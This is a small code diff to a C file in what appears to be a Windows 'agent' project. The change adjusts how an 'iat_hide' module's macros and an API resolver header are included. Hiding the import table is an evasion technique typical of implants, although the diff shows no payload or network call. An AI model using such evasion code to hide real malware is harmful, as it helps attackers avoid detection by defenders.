@@ -8,14 +8,11 @@
  * Call iat_hide_init() FIRST in main(), before any other code runs.
  */
 
-/* We need the REAL windows.h declarations before iat_hide.h redefines them.
- * Include agent.h but prevent the iat_hide.h macros from firing here
- * by defining IAT_HIDE_IMPL. */
+/* We need the REAL windows.h declarations, not the iat_hide.h macro redirects.
+ * IAT_HIDE_IMPL tells iat_hide.h to expose typedefs/externs but skip the
+ * #define macros, so this file can use the real Win32 names. */
 #define IAT_HIDE_IMPL
 #include "agent.h"
-#undef IAT_HIDE_IMPL
-
-/* Now include api_resolve.h directly for the resolver */
 #include "api_resolve.h"
 
 /* ═══════════════════════════════════════════════════════════════════
